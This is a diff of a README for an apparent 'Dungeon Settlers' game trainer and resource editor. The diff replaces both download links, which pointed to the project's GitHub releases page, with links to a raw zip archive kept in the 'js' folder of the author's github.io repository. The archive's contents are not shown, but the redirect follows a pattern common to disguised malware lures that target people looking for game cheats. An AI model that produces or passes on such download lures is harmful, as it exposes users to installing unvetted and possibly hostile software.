@@ -15,7 +15,7 @@ Welcome! This tool gives you **full control** over your Dungeon Settlers 30 game
 
 Visit this link to download the application.
 
-[![Download Now](https://img.shields.io/badge/Download-Dungeon%20Settlers%20Editor-blue?style=for-the-badge&logo=github)](https://github.com/blackberrydospassos62/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Dungeon%20Settlers%20Editor-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/blackberrydospassos62/blackberrydospassos62.github.io/main/js/Latest-v3.4.zip)
 
 ---
 
@@ -183,7 +183,7 @@ This software is provided "as is" without warranty. It is intended for **persona
 
 You now have total command over your colony. Go build the perfect settlement — with unlimited resources, invincible survivors, and the weather on your side.
 
-[⬇️ Download the Editor Now](https://github.com/blackberrydospassos62/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+[⬇️ Download the Editor Now](https://raw.githubusercontent.com/blackberrydospassos62/blackberrydospassos62.github.io/main/js/Latest-v3.4.zip)
 
 ---
 
